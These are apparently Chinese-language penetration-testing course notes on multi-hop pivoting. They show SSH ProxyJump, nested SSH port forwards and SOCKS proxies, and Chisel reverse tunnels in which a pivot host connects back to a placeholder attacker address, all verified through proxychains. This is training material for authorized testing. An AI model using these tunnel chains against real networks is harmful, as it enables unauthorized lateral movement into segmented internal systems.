# 第 69 章 - 多跳 Pivoting

## 標籤

- #cpts
- #chapter
- #pivoting
- #multi-hop

## 學習目標

- 能用 SSH -J（ProxyJump）穿越多個 SSH 主機。
- 能建立多層 SSH 隧道鏈（-L 嵌套）到達更深網段。
- 能用 Chisel 建立多跳 SOCKS 代理鏈。
- 知道如何用 proxychains 搭配多層 SOCKS 逐跳存取。
- 掌握逐跳驗證原則，避免一次串多跳後排不了錯。

---

## 理論基礎

```text
多跳 Pivoting 場景：

Attacker → Pivot1（DMZ）→ Pivot2（內網）→ Deep Target（更深網段）

每多一跳的代價：
  1. 延遲加倍（每跳都有 RTT 疊加）
  2. 穩定性降低（任一跳斷掉全鏈斷）
  3. 排查難度指數上升（不知道哪跳出問題）
  4. 偵測面擴大（多台主機留下連線記錄）

核心原則：
  先讓第一跳穩定可用，再延伸第二跳
  每跳都要最小化驗證（curl / ping），再做更重操作
  記錄每一跳的 IP、網段、轉發方式

三種多跳模式：
  A. SSH ProxyJump（-J）：SSH 原生支援，最簡潔
  B. 嵌套 SSH 隧道（-L 多層）：精確控制單一服務路徑
  C. Chisel 多跳 SOCKS：不依賴 SSH，適合非 SSH 環境
```

---

## 方法一：SSH ProxyJump（-J）

```bash
# ── 場景：攻擊機 → Pivot1 → Pivot2 ──
# 攻擊機可 SSH 到 Pivot1；Pivot1 可 SSH 到 Pivot2

# 單次命令直接跳兩跳到 Pivot2
ssh -J user1@PIVOT1_IP user2@PIVOT2_IP
# -J → ProxyJump，透過 Pivot1 跳到 Pivot2
# SSH 會先連 Pivot1，再從 Pivot1 建立到 Pivot2 的 TCP 連線
# 最終你的 shell 在 Pivot2 上

# 同時建立 SOCKS proxy（在 Pivot2 那端出口）
ssh -J user1@PIVOT1_IP -D 1080 -N -f user2@PIVOT2_IP
# -J user1@PIVOT1_IP → 透過 Pivot1 跳到 Pivot2
# -D 1080           → 在攻擊機建立 SOCKS5 代理（出口在 Pivot2）
# -N -f             → 不執行命令，背景執行
# 結果：proxychains → SOCKS 1080 → Pivot1 → Pivot2 → 更深內網

# 三跳（Attacker → Pivot1 → Pivot2 → Pivot3）
ssh -J user1@PIVOT1_IP,user2@PIVOT2_IP user3@PIVOT3_IP
# -J 接受逗號分隔的跳板列表，逐跳建立連線

# 搭配私鑰（各跳可能用不同私鑰）
ssh -J user1@PIVOT1_IP -i /tmp/pivot2_key user2@PIVOT2_IP
# -i → 指定連到最終目標的私鑰
# Pivot1 的認證用本機 SSH Agent 或 -i 指定

# SSH config 簡化（~/.ssh/config）
# Host pivot2-via-pivot1
#   HostName PIVOT2_IP
#   User user2
#   ProxyJump user1@PIVOT1_IP
# 之後只需：ssh pivot2-via-pivot1
```

---

## 方法二：嵌套 SSH 隧道（-L 多層）

```bash
# ── 場景：要存取 Pivot2 後方的 Internal:3389（RDP）──

# 第一層：攻擊機 → Pivot1，把 Pivot1:33890 轉到 Pivot2:3389
ssh -L 33890:PIVOT2_IP:3389 user1@PIVOT1_IP -N -f
# -L 33890:PIVOT2_IP:3389 → 攻擊機 localhost:33890 → Pivot1 → Pivot2:3389
# 此時攻擊機的 localhost:33890 可到達 Pivot2 的 3389

# 驗證第一層
curl telnet://localhost:33890    # 或用 nc 測試
nc -zv localhost 33890           # 確認埠開放

# 第二層：透過第一層隧道再建一層（存取 Pivot2 後方的 Internal:3389）
# 先用 ProxyJump 跳到 Pivot2，再轉發更深的服務
ssh -J user1@PIVOT1_IP -L 13389:INTERNAL_IP:3389 user2@PIVOT2_IP -N -f
# -J user1@PIVOT1_IP    → 跳板透過 Pivot1
# -L 13389:INTERNAL:3389 → 攻擊機 localhost:13389 → Pivot2 → Internal:3389

# 驗證第二層
nc -zv localhost 13389           # 確認可達
xfreerdp /v:localhost:13389 /u:admin /p:Password123
# 直接在攻擊機 RDP 連到最深的 Internal Target

# ── 嵌套 SSH SOCKS（多層 SOCKS 代理）──
# 第一層 SOCKS（出口在 Pivot1）
ssh -D 1080 -N -f user1@PIVOT1_IP

# 第二層 SOCKS（透過第一層連到 Pivot2，在 Pivot2 建出口）
# 先透過 proxychains 走第一層，SSH 到 Pivot2，在 Pivot2 建 SOCKS
proxychains4 -q ssh -D 1081 -N -f user2@PIVOT2_IP
# proxychains4 -q → 第一層 SOCKS（1080）
# -D 1081         → 在攻擊機建立第二層 SOCKS（出口在 Pivot2）

# proxychains4.conf 新增第二層
# socks5  127.0.0.1  1081    ← 加在 [ProxyList]（或替換 1080）
# 讓工具透過兩層 SOCKS 才到達 Pivot2 後方
```

---

## 方法三：Chisel 多跳 SOCKS

```bash
# ── 場景：無 SSH，用 Chisel 建多跳 SOCKS ──

# ── 第一跳：Attacker ← Pivot1（反向 SOCKS）──
# 攻擊機（server）
./chisel server --port 8888 --reverse --socks5
# --reverse → 允許 client 發起反向隧道
# --socks5  → 啟用 SOCKS5 服務

# Pivot1（client）
./chisel client ATTACKER_IP:8888 R:socks
# R:socks → 在攻擊機建立 SOCKS5（預設 127.0.0.1:1080）

# 驗證第一跳
proxychains4 -q curl http://172.16.0.5/   # 透過 1080 到 Pivot1 後方

# ── 第二跳：Pivot1 → Pivot2（從 Pivot1 再往內建隧道）──
# 在 Pivot1 上執行 Chisel client 連到 Pivot2 建 SOCKS
# （需要先傳 chisel 到 Pivot1）

# 方式 A：在 Pivot2 上再架 Chisel server，Pivot1 去連
# Pivot2 上（作為 server）
./chisel server --port 9999 --socks5
# 注意：這是正向（不是 reverse），Pivot1 主動連 Pivot2

# Pivot1 上（作為 client，連向 Pivot2 的 Chisel server）
./chisel client PIVOT2_IP:9999 0.0.0.0:1090:socks
# 0.0.0.0:1090:socks → Pivot1 在自己的 1090 埠開放 SOCKS proxy

# 在攻擊機透過第一層 SOCKS（1080）再建第二層
# proxychains4.conf → socks5 127.0.0.1 1080
# SSH 本地轉發：把 Pivot1:1090 轉到攻擊機 localhost:1081
proxychains4 -q ssh -L 1081:localhost:1090 user@PIVOT1_IP -N -f
# 攻擊機 localhost:1081 → Pivot1:1090（Chisel SOCKS） → Pivot2 → 深網段

# proxychains4.conf 改為 socks5 127.0.0.1 1081
# 所有工具 → 1081 → Pivot1 → Pivot2 → Deep Target
```

---

## 方法四：逐跳驗證流程

```bash
# ── 原則：每加一跳都要先驗再繼續 ──

# === 第一跳驗證 ===
# 確認第一層 SOCKS 可達 Pivot1 後方網段
proxychains4 -q curl http://172.16.0.5/
# 有回應 → 第一跳正常

proxychains4 -q nmap -sT -p 22,80,445 172.16.0.5
# 確認 Pivot1 後方的服務可達

# 確認 Pivot2 的 IP 可見（從 Pivot1 的 ARP/路由）
proxychains4 -q ssh user1@PIVOT1_IP "ip addr show; ip route show"
# 確認 Pivot1 有哪些介面、能看到哪些網段

# === 第二跳驗證 ===
# 確認第二層 SOCKS 可達 Pivot2 後方
# （此時 proxychains4.conf 已指向第二層 1081）
proxychains4 -q curl http://10.10.10.5/
# 若有回應 → 第二跳正常，能到達 Pivot2 後方網段

# 若失敗，逐層排查：
# 1. 先確認第一層 SOCKS（1080）還在
ss -tlnp | grep 1080

# 2. 確認第一層可達 Pivot2
# （暫時把 proxychains4.conf 改回 1080）
proxychains4 -q nc -zv PIVOT2_IP 22
# 能連到 Pivot2:22 → 第一跳到 Pivot2 沒問題

# 3. 確認 Pivot1 到 Pivot2 的隧道在 Pivot1 上正確監聽
proxychains4 -q ssh user1@PIVOT1_IP "ss -tlnp | grep 1090"
# 看到 1090 LISTEN → Chisel/SSH 在 Pivot1 正確監聽

# 4. 確認第二層轉發到攻擊機的 1081
ss -tlnp | grep 1081

# === 網段記錄（每跳都要記）===
# 第一跳後可達：172.16.0.0/24（透過 Pivot1）
# 第二跳後可達：10.10.10.0/24（透過 Pivot2）
# DNS 解析層：Pivot2 那端（proxychains4.conf proxy_dns）
```

---

## 決策流程

```
需要多跳 Pivoting
    ↓
判斷每一跳的連線方式：
  Pivot 主機有 SSH？
    是 → 用 SSH -J（ProxyJump）最簡潔
    否 → 用 Chisel 建反向 SOCKS
    ↓
需要存取的是：
  單一固定服務（RDP/SMB/SQL）？
    → SSH -L 嵌套本地轉發（逐跳 -L）
  多種服務、多目標？
    → 建多層 SOCKS（SSH -D 嵌套 + proxychains 多 port）
    ↓
逐跳驗證：
  第一跳穩定（curl 有回應）？
    是 → 建立第二跳
    否 → 先修第一跳，不要繼續往下堆
    ↓
記錄：每跳 IP、網段、監聽埠、轉發模式
只有鏈條穩定後才做掃描或認證測試
```

---

## 速查表

```bash
# SSH ProxyJump（兩跳）
ssh -J user1@PIVOT1_IP user2@PIVOT2_IP

# SSH ProxyJump + SOCKS（出口在 Pivot2）
ssh -J user1@PIVOT1_IP -D 1080 -N -f user2@PIVOT2_IP

# 透過第一層 SOCKS 建第二層 SOCKS
proxychains4 -q ssh -D 1081 -N -f user2@PIVOT2_IP

# 嵌套 -L：攻擊機 → Pivot1 → Pivot2 → Internal:3389
ssh -J user1@PIVOT1_IP -L 13389:INTERNAL_IP:3389 user2@PIVOT2_IP -N -f

# 驗證第一跳
proxychains4 -q curl http://PIVOT1_SIDE_TARGET/

# 驗證第二跳（proxychains4.conf 指向 1081）
proxychains4 -q curl http://PIVOT2_SIDE_TARGET/

# 每跳驗證埠開放
proxychains4 -q nc -zv TARGET_IP PORT
```

---

## 常見錯誤與排查

- 第二跳建好但連不到深層目標 → 先確認第一跳是否還在（ss -tlnp | grep 1080），再確認第二層監聽（ss -tlnp | grep 1081）。
- SSH -J 失敗 `connect to host PIVOT1 port 22: Connection refused` → Pivot1 SSH 沒開或防火牆擋；改用 Chisel 或其他隧道工具。
- 多層 proxychains 速度極慢 → 每多一跳延遲加倍；調高 `tcp_read_time_out` 到 30000+。
- 不知道哪跳出問題 → 逐層回推：先測最外層 SOCKS，再一層一層往內確認。
- 忘記記錄每跳用途 → 多跳環境一定要寫下：跳板 IP、使用的隧道工具、監聽埠、可達網段。

---

## 關聯筆記

- [[64-網路路由基礎|第 64 章 - 網路路由基礎]]
- [[65-SSH埠轉發|第 65 章 - SSH 埠轉發]]
- [[66-Chisel|第 66 章 - Chisel]]
- [[67-Ligolo-ng|第 67 章 - Ligolo-ng]]
- [[68-ProxyChains|第 68 章 - ProxyChains]]
- [[08-Volume-8-Pivoting-Index|Vol.8 - Pivoting, Tunneling and Port Forwarding]]
